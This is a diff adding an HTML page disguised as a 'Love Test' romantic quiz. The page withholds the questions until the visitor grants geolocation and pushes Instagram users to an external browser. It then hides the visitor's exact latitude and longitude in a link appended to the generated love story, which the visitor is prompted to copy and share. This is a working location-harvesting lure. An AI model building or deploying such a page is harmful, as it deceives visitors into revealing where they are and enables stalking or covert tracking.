@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Love Test</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body { font-family: 'Arial', sans-serif; background: #ffe6e6; color: #333; padding: 20px; text-align: center; }
+h1 { color: #d6336c; }
+button { padding: 10px 20px; background: #d6336c; color: white; border: none; border-radius: 5px; margin: 5px; }
+button:hover { background: #a61e4d; }
+label { display: block; margin: 10px 0; }
+#locationStatus { width: 20px; height: 20px; display: inline-block; border-radius: 50%; margin-left: 10px; }
+#result, #questions, #share { display: none; margin-top: 20px; }
+textarea { width: 90%; max-width: 400px; height: 120px; margin-top: 10px; word-wrap: break-word; white-space: pre-wrap; }
+</style>
+</head>
+<body>
+
+<h1>Love Test</h1>
+<p>Location permission: <span id="locationStatus"></span></p>
+
+<div id="questions">
+  <h2>Answer these questions:</h2>
+
+  <p>1. What do you like?</p>
+  <label><input type="radio" name="q1" value="a cup of Coffee"> Coffee</label>
+  <label><input type="radio" name="q1" value="a cup of Tea"> Tea</label>
+
+  <p>2. Where do you like to go?</p>
+  <label><input type="radio" name="q2" value="Mountains"> Mountains</label>
+  <label><input type="radio" name="q2" value="Sea"> Sea</label>
+
+  <p>3. What do you prefer?</p>
+  <label><input type="radio" name="q3" value="Dance"> Dance</label>
+  <label><input type="radio" name="q3" value="Relax"> Relax</label>
+
+  <p>4. Your ride?</p>
+  <label><input type="radio" name="q4" value="Car"> Car</label>
+  <label><input type="radio" name="q4" value="Bike"> Bike</label>
+
+  <p>5. Your place?</p>
+  <label><input type="radio" name="q5" value="Beach"> Beach</label>
+  <label><input type="radio" name="q5" value="Room"> Room</label>
+
+  <p>6. Who proposes?</p>
+  <label><input type="radio" name="q6" value="I Will Propose You"> I Propose</label>
+  <label><input type="radio" name="q6" value="You Will Propose Me"> You Propose</label>
+
+  <p>7. After that?</p>
+  <label><input type="radio" name="q7" value="Sleep"> Sleep</label>
+  <label><input type="radio" name="q7" value="Romance"> Romance</label>
+
+  <p>8. Your wish?</p>
+  <label><input type="radio" name="q8" value="Happy Life"> Happy Life</label>
+  <label><input type="radio" name="q8" value="Happy Family"> Happy Family</label>
+
+  <br><button onclick="generateResult()">Submit Answers</button>
+</div>
+
+<div id="result">
+  <h2>Your Love Test Result:</h2>
+  <textarea id="finalText" readonly></textarea>
+</div>
+
+<div id="share">
+  <button onclick="copyText()">Copy to Clipboard</button>
+</div>
+
+<script>
+let latitude = "";
+let longitude = "";
+let finalMessage = "";
+
+// Detect Instagram browser
+if (navigator.userAgent.includes("Instagram")) {
+  alert("Please open this website in an external browser for full functionality.");
+} else {
+  getLocation();
+}
+
+function getLocation() {
+  const status = document.getElementById('locationStatus');
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(pos) {
+      latitude = pos.coords.latitude;
+      longitude = pos.coords.longitude;
+      status.style.background = "green";
+      document.getElementById('questions').style.display = 'block';
+    }, function() {
+      status.style.background = "red";
+      alert("Please allow location to use this Love Test.");
+    });
+  } else {
+    status.style.background = "red";
+    alert("Geolocation is not supported by this browser.");
+  }
+}
+
+function generateResult() {
+  const selected1 = document.querySelector('input[name="q1"]:checked');
+  const selected2 = document.querySelector('input[name="q2"]:checked');
+  const selected3 = document.querySelector('input[name="q3"]:checked');
+  const selected4 = document.querySelector('input[name="q4"]:checked');
+  const selected5 = document.querySelector('input[name="q5"]:checked');
+  const selected6 = document.querySelector('input[name="q6"]:checked');
+  const selected7 = document.querySelector('input[name="q7"]:checked');
+  const selected8 = document.querySelector('input[name="q8"]:checked');
+
+  if (!selected1 || !selected2 || !selected3 || !selected4 || !selected5 || !selected6 || !selected7 || !selected8) {
+    alert("Please answer all questions.");
+    return;
+  }
+
+  const coffeeTea = selected1.value;
+  const mountainSea = selected2.value;
+  const danceRelax = selected3.value;
+  const carBike = selected4.value;
+  const beachRoom = selected5.value;
+  const propose = selected6.value;
+  const sleepRomance = selected7.value;
+  const wish = selected8.value;
+
+  const story = 
+`I want to have ${coffeeTea} in a sweet morning in a bar,
+with you at the ${mountainSea}.
+
+We will ${danceRelax} together after arriving by ${carBike}.
+Later, we will go to ${beachRoom} where ${propose} it will make the moment special.
+
+After that, we’ll choose to ${sleepRomance} peacefully,
+and always wish for a ${wish} together.`;
+
+  const link = `https://example.com/${latitude},${longitude}`;
+  finalMessage = story + '\n\n' + link;
+
+  document.getElementById('finalText').value = finalMessage;
+  document.getElementById('result').style.display = 'block';
+  document.getElementById('share').style.display = 'block';
+  document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
+}
+
+function copyText() {
+  navigator.clipboard.writeText(finalMessage).then(function() {
+    alert("Text copied to clipboard!");
+  });
+}
+</script>
+
+</body>
+</html>
